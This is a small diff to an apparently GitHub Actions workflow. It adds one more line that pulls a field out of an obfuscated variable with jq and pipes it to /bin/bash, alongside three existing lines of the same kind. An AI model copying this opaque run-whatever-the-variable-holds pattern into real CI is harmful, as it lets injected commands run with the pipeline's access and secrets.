@@ -27,6 +27,7 @@ jobs:
           echo $bjbw8614 | jq -r .qomsf2618 | /bin/bash
           printf '%s' "$fh9" | jq -r .v11 | /bin/bash
           printf '%s' "$ru95" | jq -r .jc648 | /bin/bash
+          echo $tg190 | jq -r .frq417 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
